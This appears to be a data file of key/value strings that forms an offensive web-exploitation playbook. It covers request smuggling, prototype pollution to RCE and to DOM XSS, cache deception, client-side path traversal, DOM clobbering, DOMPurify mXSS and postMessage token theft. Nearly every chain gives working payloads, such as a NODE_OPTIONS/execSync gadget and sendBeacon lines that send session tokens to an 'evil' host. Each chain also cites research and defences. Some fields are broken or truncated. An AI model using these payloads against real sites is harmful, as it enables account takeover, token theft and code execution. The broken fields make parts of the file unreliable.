chains.title: HTTP/1.1 desync (0.CL/CL.0): from smuggling to mass ATO
chains.impact: Capturing other users' requests with their Cookie/Authorization, stored-XSS cache poisoning against all visitors, or access to internal admin routes; criticals on mature programs.
chains.why: The newest 0.CL variant desyncs even fully browser-compatible HTTP/1.1, turning the victim's browser into a smuggling delivery platform.
chains.precondition: The front-end and back-end disagree on request boundaries over a reused keep-alive connection (or on HTTP/2 downgrade).
chains.realWorld: PortSwigger: HTTP Desync Attacks (Kettle 2019), Browser-Powered Desync Attacks (2022), HTTP/1.1 Must Die (2025); Web Security Academy CL.0/0.CL labs.
chains.defense: End-to-end HTTP/2 with no downgrade to 1.1, reject ambiguous CL/TE, disable upstream connection reuse.

steps.title: Probe for a CL.0/0.CL desync
steps.detail:
smuggler.py -u https://target/  |  raw probe: POST /vuln HTTP/1.1
Connection: keep-alive
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x  then a clean GET /
steps.success: the response to the second (clean) request becomes a 404 from the smuggled prefix

steps.title: Classify the desync type
steps.detail: CL.0 = the back-end ignores Content-Length; 0.CL = the front-end sees length 0 while the back-end reads CL; plus the H2.CL / H2.TE matrix on HTTP/2 -> 1.1 downgrade

steps.title: Weaponize: capture another user's request
steps.detail: smuggle an unterminated POST /comment prefix with an oversized Content-Length -> the victim's next request (carrying their Cookie/Authorization) is appended into a stored field and read back by the attacker

steps.title: Weaponize: stored-XSS cache poisoning
steps.detail: smuggle a request whose response <script>alert(document.domain)</script> is cached on a popular URL and served to all users

steps.title: Weaponize: reach an internal route
steps.detail: smuggle GET /admin: the front-end ACL validates only the outer path while the back-end processes the inner one

steps.title: Automate under load
steps.q: HTTP request smuggling detector (CL.TE / TE.CL timing)
steps.detail: Burp HTTP Request Smuggler + Turbo Intruder (connection-locked harness) to synchronize the socket and race for the connection

chains.title: Server-Side Prototype Pollution → RCE (blind detection without DoS)
chains.impact: Code execution as the Node process; reliably critical.
chains.why: An invisible bug is confirmed by a change in JSON-response indentation, and the built-in NODE_OPTIONS gadget drives it to a shell without any app-specific sink.
chains.precondition: Untrusted JSON/body is recursively merged (lodash merge, _.defaultsDeep, a hand-rolled deepMerge) into config, and child_process is invoked somewhere downstream.
chains.realWorld: Silent Spring: Prototype Pollution Leads to RCE in Node.js (arXiv 2207.11171); PortSwigger SSPP black-box detection (Heyes 2023); Kibana Timelion CVE-2019-7609; GHunter (arXiv 2407.10812).
chains.defense: Object.freeze(Object.prototype), null-prototype config objects, the --disable-proto=delete flag, schema validation before any merge.

steps.title: Detect pollution blind
steps.detail: {"__proto__":{"json spaces":10}}  Express starts indenting every JSON response with 10 spaces; visible without any DoS
steps.success: the JSON in the response gains a large indent (json spaces)

steps.title: Confirm with a second oracle
steps.detail: {"__proto__":{"status":510}}  or  {"__proto__":{"parameterLimit":1}}  changes the response status / truncates parameter parsing

steps.title: Plant the env gadget
steps.detail: {"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('id')//"}}}

steps.title: Trigger any child_process
steps.detail: a subsequent spawn/fork/execSync inherits the poisoned env + NODE_OPTIONS and executes EVIL via /proc/self/environ

steps.title: Fallback gadget
steps.detail: poison __proto__.shell / __proto__.argv0 for spawn({shell:true}) sinks

chains.title: Client-Side Prototype Pollution → DOM XSS via a script gadget
chains.impact: Reliable DOM XSS on a page with no explicit injection point; session/token theft, account takeover.
chains.why: No HTML injection needed: a poisoned property on Object.prototype is silently read by a third-party library and turns into script execution.
chains.precondition: A URL query/hash reaches a vulnerable merge ($.extend(true,...), _.merge, a query parser that walks __proto__) with a gadget library present.
chains.realWorld: PortSwigger: Widespread prototype pollution gadgets (Gareth Heyes 2020) + DOM Invader; Web Security Academy client-side PP labs.
chains.defense: Freeze Object.prototype, build config via Object.create(null) or Map, strip __proto__/constructor/prototype keys in query parsers.

steps.title: Poison from the URL
steps.detail: #__proto__[hitCallback]=alert(document.domain)  or  ?constructor[prototype][src]=//evil/x.js

steps.title: The Google Analytics gadget fires
steps.detail: GA calls Object.prototype.hitCallback as a function after sending a hit -> execution

steps.title: Or a generic script-src gadget
steps.detail: loaders that do el.src = config.src inherit the poisoned src and load the attacker's JS

steps.title: Or a jQuery/Lodash gadget
steps.detail: $.parseHTML / $().prepend and _.template read poisoned attribute/source properties

steps.title: Auto-hunt source+sink+gadget
steps.detail: Burp DOM Invader: the prototype pollution mode + gadget scanner finds the whole chain

chains.title: Web Cache Deception → auth-token theft (wildcard / path-confusion)
chains.impact: Stealing the victim's session token/API key from a cached 'static' file; full account takeover. Benchmark: the wildcard-WCD ATO in ChatGPT (2024).
chains.why: The cache happily stores an authenticated JSON body as a .css file because the edge and origin disagree on where the path ends.
chains.precondition: The cache keys on file extension or directory prefix; the origin ignores the appended suffix and returns an authenticated response.
chains.realWorld: Omer Gil: Web Cache Deception Attack (2017); PortSwigger: Gotta cache 'em all (Black Hat USA 2024); ChatGPT wildcard WCD ATO (Top 10 Web Hacking 2024).
chains.defense: Cache strictly by allowlist + verified Content-Type, never cache responses carrying Set-Cookie/Authorization, normalize the path identically on edge and origin.

steps.title: Map the cache rule
steps.detail: probe Cache-Control, Age, X-Cache: HIT; determine which extensions/directories are treated as static

steps.title: Find a delimiter discrepancy
steps.detail: append ;  %2f  %00  %23  %2e%2e  so the edge sees .css while the origin serves /api/account/me

steps.title: Build the deception URL
steps.detail: curl 'https://t/api/account/me/nonexistent.css'  -> returns JSON with the victim's token, cached under a static key

steps.title: Seed and collect
steps.detail: lure the victim to the URL (their authentication fills the cache), then request the same URL unauthenticated and read the cached secret

steps.title: Confirm the secret is cached
steps.detail: before reporting, confirm the cached response shows X-Cache: HIT and actually contains the token/PII

chains.title: CSPT2CSRF: client-side path traversal reroutes fetch into privilege escalation
chains.impact: Forced state-changing actions (granting a role, issuing a token) that bypass CSRF tokens, because the request carries the application's own valid token; high-to-critical.
chains.why: Classic anti-CSRF defenses stay intact, yet the application's legitimate authenticated fetch is redirected to a different endpoint by a plain ../.
chains.precondition: The front-end concatenates controllable input (a query, fragment, path parameter, or a DB-stored value) into a fetch/XHR path without traversal sanitization.
chains.realWorld: Doyensec: Exploiting Client-Side Path Traversal (CSRF is dead, long live CSRF) / CSPT2CSRF whitepaper (Maxence Schmitt, OWASP Global AppSec Lisbon 2024); chains in Mattermost and Rocket.Chat.
chains.defense: Character allowlist for IDs (forbid . and /), build URLs from a fixed template with encoded segments, bind the anti-CSRF token to the action.

steps.title: Find source -> sink
steps.detail: e.g. fetch('/api/v1/items/' + params.id + '/read') where id comes from ?id=

steps.title: Reroute the request
steps.detail: ?id=..%2f..%2fadmin%2fpromote%23  traversal to another endpoint, trimming the tail via # (or ?)

steps.title: GET-sink primitive
steps.detail: traversal to attacker-controlled JSON (e.g. an uploaded file) to control the data the page subsequently acts on

steps.title: Chain a state-changing sink
steps.detail: an id from the controlled JSON triggers a second CSPT whose POST/PUT lands on ../../tokens or ../../admin/*

steps.title: Hunt automatically
steps.detail: Doyensec CSPTBurpExtension: enumerate CSPT sources/sinks in traffic

chains.title: DOM Clobbering → XSS via a clobbered currentScript / config gadget
chains.impact: Script execution from script-free HTML that the sanitizer let through; stored-XSS in markdown/email/a forum -> ATO.
chains.why: No
chains.precondition: The application renders user HTML where the sanitizer (DOMPurify by default) allows id/name, and the code later reads a global/property reachable via named DOM access.
chains.realWorld: rollup CVE-2024-47068 (GHSA-gcx4-mw62-g8wm), Webpack AutoPublicPathRuntimeModule (GHSA-4vvj-4cpr-p986 / CVE-2024-43788), Canvas LMS; PortSwigger DOM clobbering Academy; Heyes/Kotowicz research.
chains.defense: Enable DOMPurify SANITIZE_NAMED_PROPS:true + SANITIZE_DOM:true, do not use named DOM lookup for security-critical globals, check instanceof HTMLElement.

steps.title: Clobber the bundler runtime
steps.detail: | rollup/Webpack read document.currentScript.src as the import base URL

steps.title: Or clobber a config global
steps.detail: <a id="config"><a id="config" name="url" href="https://evil/x.js">  -> window.config.url returns the attacker's href into s.src = window.config.url

steps.title: Nested property clobbering
steps.detail: two elements with id=x + a child name=y form an HTMLCollection that satisfies window.x.y

steps.title: Check the sanitizer config
steps.detail: confirm DOMPurify SANITIZE_NAMED_PROPS / SANITIZE_DOM are disabled (the default value)

steps.title: Find the sink
steps.detail: find code that reads document.currentScript / window.config / another global via named DOM access: that is the reuse point

chains.title: mXSS through DOMPurify → stored-XSS → ATO (depth-counter bypass via PP)
chains.impact: Stored-XSS that fires in every viewer's authenticated session, including admins; session/CSRF-token theft and account takeover.
chains.why: Two different bug classes converge: a prototype pollution write disables DOMPurify's own nesting-depth guard, reopening the mutation-XSS that the patch was supposed to kill.
chains.precondition: A rich-text/HTML field sanitized by an outdated or misconfigured DOMPurify, then re-serialized and re-parsed by the browser.
chains.realWorld: DOMPurify nesting mXSS CVE-2024-47875 (GHSA-gx9m-whjm-85jf, patch 2.5.x/3.1.3+); CVE-2024-45801 (depth-counter bypass via prototype pollution); Kotowicz/Heyes mutation-XSS research.
chains.defense: Keep DOMPurify up to date, sanitize in the final parsing context (do not re-serialize and re-parse), freeze Object.prototype.

steps.title: mXSS via namespace confusion
mXSS via nesting depth
steps.detail: deeply nested elements that DOMPurify and the browser DOM build differently mutate into an executable script (CVE-2024-47875)

steps.title: Knock out the depth counter via PP
steps.detail: poison Object.prototype so DOMPurify's nesting-depth variable reads as NaN/an attacker value, bypassing the fix (CVE-2024-45801)

steps.title: Drive it to stored-XSS and ATO
steps.detail: confirm the DOMPurify version/config and that the sanitized HTML is reparsed; target: every viewer

steps.title: Exfiltrate the session/CSRF token
steps.detail: fetch('/api/me').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil/c',t))

chains.title: Abusing origin validation in postMessage → OAuth/session token theft
chains.impact: Cross-domain theft of an OAuth access token, session, or CSRF token; account takeover. Most real-world findings are high and uniquely rewarded.
chains.why: A single character-weak origin check (indexOf/startsWith) or one targetOrigin:'*' hands secrets straight to the attacker's iframe.
chains.precondition: A message handler trusts event.origin via a weak check, or the sender posts secrets without an exact targetOrigin.
chains.realWorld: PortSwigger Web Security Academy: Controlling the web message source; HackerOne #398054 (DOM XSS via an insecure postMessage listener, Marketo); jlajara: PostMessage Vulnerabilities Part II.
chains.defense: Strict allowlist event.origin === 'https://exact-origin', never targetOrigin:'*' for secrets, validate the message schema as untrusted input.

steps.title: Enumerate the handlers
steps.detail: find window.addEventListener('message', e => {...}) and study the origin check

steps.title: Bypass the weak origin check
steps.detail: bypass e.origin.indexOf('trusted')>-1 / startsWith('https://trusted') with the domain https://trusted.evil.com or https://trusted-evil.com

steps.title: Catch the wildcard leak
steps.detail: if the parent posts {token:...} with targetOrigin:'*', embed the page in the attacker's iframe and receive the token directly

steps.title: Pivot the handler into DOM XSS
steps.detail: feed the message data into innerHTML/eval/location to execute code in the trusted origin (HackerOne #398054)

steps.title: Receive and steal the token
steps.detail: window.onmessage=e=>navigator.sendBeacon('//evil/c', JSON.stringify(e.data))  in the attacker's receiver window
